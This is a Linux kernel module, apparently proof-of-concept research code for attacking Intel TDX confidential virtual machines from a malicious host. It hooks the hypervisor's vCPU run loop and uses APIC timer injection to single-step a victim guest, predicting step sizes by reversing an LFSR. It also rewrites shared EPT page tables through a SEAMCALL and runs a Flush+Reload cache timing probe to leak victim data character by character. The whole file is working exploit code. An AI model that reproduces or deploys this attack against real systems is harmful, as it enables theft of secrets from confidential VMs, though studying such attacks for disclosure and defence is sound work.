#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include <linux/debugfs.h>
#include <linux/vmalloc.h>
#include "int.h"
#define ATTACKER KERN_INFO "attacker: "
#define IA32_TSC_DEADLINE 0x6e0
volatile uint64_t result = 0;
volatile uint64_t done = 0;
volatile uint64_t target_addr = 0;
volatile uint64_t char_step_cnt = 0;
volatile uint64_t char_cnt = 0;
volatile uint64_t char_idx = 0;
volatile uint64_t flush_reload_steps = 0;
volatile bool address_ready = false;
volatile char* fr_addr = 0;

void serialize_(void)
{
  asm volatile("serialize" ::: "memory");
}
uint64_t rdtsc_nofences_(void)
{
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d)::"memory");
  return (d << 32) | a;
}

int ioctl_major = 0;
int ioctl_minor = 0;
struct class *chardev_class = NULL;

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
struct file_operations ioctl_interface_fops = {
    .owner = THIS_MODULE,
    .read = NULL,
    .write = NULL,
    .open = NULL,
    .unlocked_ioctl = ioctl,
    .release = NULL,
    .mmap = NULL};
struct cdev cdev = {
    .owner = THIS_MODULE,
    .ops = &ioctl_interface_fops};

void update_tsc_deadline(void)
{
  size_t beg = rdtsc_nofences_() + 2000000000 / 10;
  asm volatile("wrmsr" ::"c"(IA32_TSC_DEADLINE), "a"(beg), "d"(beg >> 32) : "memory");
}

extern void (*volatile vcpu_run_beg_hook)(struct OutData *);
extern void (*volatile vcpu_run_end_hook)(struct OutData *);
extern void (*volatile vcpu_run_end_hook2)(void *);

void dumpSharedEPT(uint64_t eptp)
{
  eptp &= ~0xfffULL;
  uint64_t *epml4_virt = page_address(pfn_to_page(eptp / 4069ULL));
  uint64_t i = 0;
  for (i = 0; i < 512; ++i)
    printk("EPML4: %llx: %llx\n", i, epml4_virt[i]);
  for (i = 0; i < 512; ++i)
    epml4_virt[i] = -1ULL;
}

static bool page_mapping_exist(unsigned long addr, size_t size)
{
  pgd_t *pgd;
  p4d_t *p4d;
  pmd_t *pmd;
  pud_t *pud;
  pte_t *pte;
  struct mm_struct *mm = current->mm;
  unsigned long end_addr;
  pgd = pgd_offset(mm, addr);
  if (unlikely(!pgd) || unlikely(pgd_none(*pgd)) || unlikely(!pgd_present(*pgd)))
    return false;
  p4d = p4d_offset(pgd, addr);

  if (unlikely(!p4d) || unlikely(p4d_none(*p4d)) || unlikely(!p4d_present(*p4d)))
    return false;

  pud = pud_offset(p4d, addr);
  if (unlikely(!pud) || unlikely(pud_none(*pud)) || unlikely(!pud_present(*pud)))
    return false;

  pmd = pmd_offset(pud, addr);
  if (unlikely(!pmd) || unlikely(pmd_none(*pmd)) || unlikely(!pmd_present(*pmd)))
    return false;

  if (pmd_trans_huge(*pmd))
  {
    end_addr = (((addr >> PMD_SHIFT) + 1) << PMD_SHIFT) - 1;
    goto end;
  }
  pte = pte_offset_kernel(pmd, addr);
  if (unlikely(!pte) || unlikely(!pte_present(*pte)))
    return false;
  end_addr = (((addr >> PAGE_SHIFT) + 1) << PAGE_SHIFT) - 1;
end:
  if (end_addr >= addr + size - 1)
    return true;
  return page_mapping_exist(end_addr + 1, size - (end_addr - addr + 1));
}

static bool addr_valid(unsigned long addr, size_t size)
{
  int i;
  for (i = 0; i < size; i++)
  {
    if (!virt_addr_valid(addr + i))
      return false;
  }
  if (!page_mapping_exist(addr, size))
    return false;
  return true;
}
int injected = 0;
int old_timer = 0;

uint64_t old_lvt_timer = 0;

int inj = 0;

uint64_t start_tsc;

atomic_t unloading;
atomic_t hit;
uint64_t rdtsc_nofences(void)
{
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d)::"memory");
  return (d << 32) | a;
}
void mfence(void)
{
  asm volatile("mfence" ::: "memory");
}
void lfence(void)
{
  asm volatile("lfence" ::: "memory");
}

atomic_t t_mode;

#define OFFSET (4096)

unsigned long int_buffer[8] = {};
int buf_int = 0;

char *debug_buffer;
size_t debug_len;
const size_t debug_max = 1024ULL * 1024ULL * 1024ULL;
static struct dentry *data_file;
static struct dentry *subdir;

static ssize_t data_read(struct file *, char *, size_t, loff_t *);
static ssize_t data_read(struct file *f, char *buffer,
                         size_t len, loff_t *offset)
{
  return simple_read_from_buffer(buffer, len, offset, debug_buffer, debug_len);
}

int printDebug(const char *fmt, ...)
{
  if (debug_len == debug_max)
    debug_len = 0;
  int i = snprintf(debug_buffer + debug_len, debug_max - debug_len, "[%llu] ", rdtsc());
  debug_len += i;
  if (debug_len == debug_max)
    debug_len = 0;
  va_list args;

  va_start(args, fmt);
  i = vsnprintf(debug_buffer + debug_len, debug_max - debug_len, fmt, args);
  va_end(args);
  debug_len += i;

  return i;
}

char *getAddr(struct OutData *vcpu, size_t pfn)
{
  struct kvm_mmu_page *node;
  struct tdp_iter iter;

  // printk("TDX phys: %lx\n", vcpu->mmu->next->next->next);
  // printk("TDX phys: %lx\n", vcpu->mmu->next);
  list_for_each_entry(node, vcpu->mmu_root, link)
  {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_4K, pfn, pfn + 1)
    {

      if (iter.old_spte & 0b111)
      {
        if (iter.gfn == pfn)
        {
          return (char *)__va((iter.old_spte & ~0xfffULL) & ((1ULL << 51) - 1));
        }
      }
    }
  }
  list_for_each_entry(node, vcpu->mmu_root, link)
  {
    for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, pfn, pfn + 1)
    {

      if (iter.old_spte & 0b111)
      {
        if (iter.gfn == (pfn & ~0x1ffULL))
        {
          return (char *)__va((iter.old_spte & ~0x1fffffULL) & ((1ULL << 51) - 1)) + (pfn & 0x1ffULL) * 4096;
        }
      }
    }
  }
  printk("not found %lx\n", pfn);
  return 0;
}
void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p)); }
void maccess(void *p) { asm volatile("mov (%0), %%eax\n" : : "c"(p) : "eax","memory"); }

size_t accessed(void *addr) {
  size_t sum = 0;
  size_t i = 0;
  mfence();
  size_t b = rdtsc_nofences();
  //maccess(addr);
  flush(addr);
  mfence();
  size_t e = rdtsc_nofences();
  //printk("TDX2: %lld\n", e-b);
  mfence();
  return e-b;
}

void *attacker_td;
const uint32_t MASK = 0xB4BCD35C;

uint8_t lfsr_outputs[40];
size_t lfsr_cnt = 0;
uint32_t state = 0;

void lfsrStep(void)
{
  uint8_t s = state & 1;
  state = state >> 1;
  if (s)
    state ^= MASK;
}

void reverseState(void)
{
  for (size_t i = 31; i < 40; --i)
  {
    size_t c = lfsr_outputs[i] & 1;
    if (c)
      state = state ^ MASK;
    state = (state << 1) | c;
  }
  for (size_t i = 0; i < 31; ++i)
    lfsrStep();
}

void hook1(struct OutData *vcpu)
{

  if (atomic_read(&unloading))
  {
    apic->write(0x320, 0x400ec);
    apic->write(0x380, old_timer);
    update_tsc_deadline();
    return;
  }
  struct kvm_vcpu_arch *arch = (struct kvm_vcpu_arch *)vcpu->kvm_vcpu_arch;

  if (inj)
  {

    for (size_t i = 0; i < 8; ++i) {
        // if (vcpu->desc->pir[i]) {
        //   int_buffer[i] |= vcpu->desc->pir[i];
        //   buf_int = 1;
        //   printk("TDXX: int buffered\n");
        // }
        vcpu->desc[i] = 0;
    }

    injected = 1;
    inj = 0;
    serialize();
    apic->write(0x320, 0xecU);
    apic->write(0x380, 2);
    atomic_set(&hit, 0);
    // start_tsc = rdtsc_nofences_();
  }
}
struct tdx_module_args
{
  /* callee-clobbered */
  u64 rcx;
  u64 rdx;
  u64 r8;
  u64 r9;
  /* extra callee-clobbered */
  u64 r10;
  u64 r11;
  /* callee-saved + rdi/rsi */
  u64 r12;
  u64 r13;
  u64 r14;
  u64 r15;
  u64 rbx;
  u64 rdi;
  u64 rsi;
};
u64 __seamcall_saved_ret(u64 fn, struct tdx_module_args *args);

uint64_t *adddr = 0;

uint64_t stepcnt = 0;

volatile void *victim_td;

void hook2(struct OutData *vcpu)
{
  if (atomic_read(&unloading))
  {
    apic->write(0x320, 0x400ec);
    apic->write(0x380, old_timer);
    update_tsc_deadline();
    return;
  }
  if (injected)
  {


    // TODO: F&F here


    // Single-Stepping
    if (atomic_read(&t_mode) == 3)
    {
      flush_reload_steps += 1;
      stepcnt += 1;



      if(address_ready && fr_addr >= 4096)
      {
        size_t timing = accessed(fr_addr);
        if(timing > 130)
        {
          printDebug("FlushReloadAttack: Hit! Steps between hits: {%4zd}  {%4d}\n", flush_reload_steps, timing);
          flush_reload_steps = 0;
        }
      }


    }

    if (!adddr)
    {
      printDebug("TDX: injection wihtout setup, odd....\n");
      goto next;
    }
    // printk("STEPS: 0x%lx,\n", *adddr);

    //  Gather LFSR state
    if (atomic_read(&t_mode) == 1)
    {
      lfsr_outputs[lfsr_cnt++] = *adddr - 1;
      if (lfsr_cnt == 40)
      {
        lfsr_cnt = 0;

        reverseState();
        for (size_t i = 32; i < 40; ++i)
        {
          lfsrStep();
          if (lfsr_outputs[i] != (state & 0x1f))
          {
            lfsr_cnt = 0;
            printDebug("TDX: calibration failed, retry\n");
            goto next;
          }
        }
        atomic_set(&t_mode, 2);
        printDebug("TDX: calibrate done %x\n", state);
      }
    }

    // Step attacker, check predicted step size
    if (atomic_read(&t_mode) == 2 && *adddr != ((state & 0x1f) + 1))
    {
      lfsr_cnt = 0;
      atomic_set(&t_mode, 1);
      printDebug("TDX: Prediction wrong, recalibrate\n");
    }

    // Anytime when not calibrating
    if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100)
    {
      lfsrStep();
      if ((state & 0x1f) == 0)
      {
        // Step victim
        atomic_set(&t_mode, 3);
        inj = 1;
      }
      else
        atomic_set(&t_mode, 2); // Step Attacker
    }
  next:
    injected = 0;
  }

  // uint64_t reason = vcpu->exit_reason;
  // uint64_t reg_bitmap = vcpu->kvm_vcpu_arch[VCPU_REGS_RCX];
  uint64_t vspec_vmcall = vcpu->kvm_vcpu_arch[VCPU_REGS_R10];
  uint64_t vmcall_leaf = vcpu->kvm_vcpu_arch[VCPU_REGS_R11];

  int is_vmcall = vcpu->exit_reason == 0x4d;

  // Sync victim, print step count
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000042ULL)
  {
    victim_td = vcpu->vcpu;
    if (atomic_read(&t_mode) == 0)
      atomic_set(&t_mode, 100);
    if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100)
      printDebug("TDX: steps counted: %lu\n", stepcnt);
    stepcnt = 0;
  }


  // Setup shared memory
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000069ULL)
  {
    attacker_td = vcpu->vcpu;
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 1)
    {

      struct tdx_module_args test = {
          /* callee-clobbered */
          .rcx = vcpu->tdvpr_pa,
          .rdx = 0x203CULL | 3ULL << 32,
          .r8 = 0,
          .r9 = 0,
          /* extra callee-clobbered */
          .r10 = 0,
          .r11 = 0,
          /* callee-saved + rdi/rsi */
          .r12 = 0,
          .r13 = 0,
          .r14 = 0,
          .r15 = 0,
          .rbx = 0,
          .rdi = 0,
          .rsi = 0
      };
      uint64_t ret = __seamcall_saved_ret(26, &test);
      printDebug("TDX seam result: rax %llx r8 %llx\n", ret, test.r8);
      printDebug("TDX seam result: sizes %lx %lx %lx %lx\n", sizeof(EPTPageDirectoryPointerTableEntry), sizeof(EPTPageDirectoryEntry), sizeof(EPTPageTableEntry), sizeof(EPTPageMapLevel4Entry));
      uint64_t shared_pfn = test.r8 / 4096;
      uint64_t *sp = (uint64_t *)page_address(pfn_to_page(shared_pfn));
      EPTPageMapLevel5Entry *pml5 = (EPTPageMapLevel5Entry *)sp;

      // if ((sp[256]&0b111) == 0 || 1)
      {
        EPTPageMapLevel4Entry *pml4 = (EPTPageMapLevel4Entry *)get_zeroed_page(GFP_KERNEL);
        pml5[15].page_ppn = virt_to_phys(pml4) / 4096;
        pml5[15].write = 1;
        pml5[15].read = 1;
        pml5[15].execute = 0;
        EPTPageDirectoryPointerTableEntry *pdpt = (EPTPageDirectoryPointerTableEntry *)get_zeroed_page(GFP_KERNEL);
        pml4[511].page_ppn = virt_to_phys(pdpt) / 4096;
        pml4[511].write = 1;
        pml4[511].read = 1;
        pml4[511].execute = 0;
        EPTPageDirectoryEntry *pd = (EPTPageDirectoryEntry *)get_zeroed_page(GFP_KERNEL);
        pdpt[511].page_ppn = virt_to_phys(pd) / 4096;
        pdpt[511].write = 1;
        pdpt[511].read = 1;
        pdpt[511].execute = 0;
        EPTPageTableEntry *pt = (EPTPageTableEntry *)get_zeroed_page(GFP_KERNEL);
        pd[511].page_ppn = virt_to_phys(pt) / 4096;
        pd[511].write = 1;
        pd[511].read = 1;
        pd[511].execute = 1;
        pd[511].suppress_ve = 0;
        uint64_t *page = (uint64_t *)get_zeroed_page(GFP_KERNEL);
        pt[511].page_ppn = virt_to_phys(page) / 4096;
        // pt[511].page_ppn = enc_ppn;
        pt[511].write = 1;
        pt[511].read = 1;
        pt[511].execute = 1;
        pt[511].suppress_ve = 0;
        adddr = page;
        // page[0] = 0x12345678ULL;
      }
    }

    // Ready to single-step
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 2)
    {
      if (atomic_read(&t_mode) == 100 || atomic_read(&t_mode) == 1)
        atomic_set(&t_mode, 1);
      inj = 1;
    }
  }

  // Start single character leak
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x400000f0ULL)
  {
    printDebug("TDX: Before character: steps counted: %lu\n", stepcnt);

    // first just print the step count

    //if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100)
    
    stepcnt = 0;
  }

  // End single character leak
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x400000f1ULL)
  {
    //if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100)
    printDebug("TDX: after character: steps counted: %lu\n", stepcnt);
    
    stepcnt = 0;
    //atomic_set(&t_mode, 100); // let it go freely until next character
  }

  // Start decoding base32
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x400000ffULL)
  {
    printDebug("qwer   : %lu\n", stepcnt);

    victim_td = vcpu->vcpu;

    if (atomic_read(&t_mode) > 1 && atomic_read(&t_mode) < 100)
      printDebug("TDX: Begin new decoding: %lu\n", stepcnt);
    stepcnt = 0;
    target_addr = vcpu->kvm_vcpu_arch[VCPU_REGS_R13];
    
  }

  // Second part of address
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x400000fdULL)
  {
    printDebug("asdf   : %lu\n", stepcnt);

    target_addr |= vcpu->kvm_vcpu_arch[VCPU_REGS_R13] << 32;
    printDebug("TDX: Target Address   : %lx\n", target_addr);

    fr_addr = getAddr(vcpu, target_addr/4096);


    printDebug("TDX: Got host Address   : %lx\n", fr_addr);


    fr_addr += target_addr % 4096;


    address_ready = true;
    stepcnt = 0;
    flush_reload_steps = 0;
    if (atomic_read(&t_mode) == 0)
      atomic_set(&t_mode, 100);
  }

  // Done decoding base32
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x400000feULL)
  {
    printDebug("It is done.   : %lu\n", stepcnt);
    stepcnt = 0;


    atomic_set(&t_mode, 0);
    inj = 0;

  }

}

void *volatile last;

void hook3(void *vcpu)
{
  while (vcpu == victim_td && (atomic_read(&t_mode) == 1 || atomic_read(&t_mode) == 2 || atomic_read(&t_mode) == 100) && !atomic_read(&unloading))
  {
    yield();
  }
  while (vcpu == attacker_td && (atomic_read(&t_mode) == 3) && !atomic_read(&unloading))
  {
    yield();
  }
  if (atomic_read(&unloading))
  {
    apic->write(0x320, 0x400ec);
    apic->write(0x380, old_timer);
    update_tsc_deadline();
    return;
  }
}

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
  long ret = -1;
  struct Args args;

  switch (cmd)
  {
  case COLLECT:
    ret = copy_from_user(&args, (void *)arg, sizeof(struct Args));
    done = 0;
    if (ret != 0)
      break;
    break;
  case END:
    done = 1;
    ret = 0;
    break;
  default:
    printk(ATTACKER "ioctl cmd not found\n");
    ret = -1;
    break;
  }
  return ret;
}

const struct file_operations data_file_fops = {
    .owner = THIS_MODULE,
    .read = data_read,
};

int chrecfunc(void *) {
  asm volatile("cli":::"memory");
  while (!atomic_read(&unloading)) {
    if(address_ready && fr_addr >= 4096)
    {
          
      size_t timing = accessed(fr_addr);
      if(timing > 115)
      {
        atomic_set(&hit, 1);
        //printDebug("FlushReloadAttack: Hit! Steps between hits: {%4zd}  {%4d}\n", flush_reload_steps, timing);
        //flush_reload_steps = 0;
      }
    }
  }
  asm volatile("sti":::"memory");
  return 0;
}

int init_module(void)
{
  atomic_set(&t_mode, 0);
  atomic_set(&unloading, 0);
  atomic_set(&hit, 0);

  // dev_t devno;
  // int error = alloc_chrdev_region(&devno, ioctl_minor, 1, DEVICE_NAME);
  // ioctl_major = MAJOR(devno);
  // if (error < 0) {
  //   return -1;
  // }
  // devno = MKDEV(ioctl_major, ioctl_minor);
  // cdev_init(&cdev, &ioctl_interface_fops);
  // cdev.owner = THIS_MODULE;
  // error = cdev_add(&cdev, devno, 1);
  // if (error < 0) {
  //   cdev_del(&cdev);
  //   unregister_chrdev_region(devno, 1);
  //   return -1;
  // }

  // chardev_class = class_create(DEVICE_NAME);
  // device_create(chardev_class, NULL, devno, NULL, DEVICE_NAME);
  debug_buffer = vmalloc(1024ULL * 1024ULL * 1024ULL);
  if (!debug_buffer)
  {
    return -1;
  }
  subdir = debugfs_create_dir("tdxmod", NULL);
  if (!subdir)
  {
    vfree(debug_buffer);
    return -1;
  }
  data_file = debugfs_create_file("data", 0644, subdir, NULL, &data_file_fops);
  if (!data_file)
  {
    vfree(debug_buffer);
    debugfs_remove_recursive(subdir);
    return -1;
  }

  // struct task_struct *thrd = kthread_create(chrecfunc, 0, "tdxupdate");
  // kthread_bind(thrd, 13);
  // wake_up_process(thrd);

  printDebug("loading\n");
  vcpu_run_beg_hook = (void *)hook1;
  vcpu_run_end_hook = (void *)hook2;
  vcpu_run_end_hook2 = (void *)hook3;
  return 0;
}

void cleanup_module(void)
{
  atomic_set(&unloading, 1);
  printDebug("unload.\n");
  debugfs_remove_recursive(subdir);
  vfree(debug_buffer);
  // dev_t devno = MKDEV(ioctl_major, ioctl_minor);
  // device_destroy(chardev_class, devno);
  // class_destroy(chardev_class);

  // cdev_del(&cdev);
  // unregister_chrdev_region(devno, 1);
  vcpu_run_beg_hook = 0;
  vcpu_run_end_hook = 0;
  vcpu_run_end_hook2 = 0;
  msleep(1000);
}

MODULE_LICENSE("GPL");
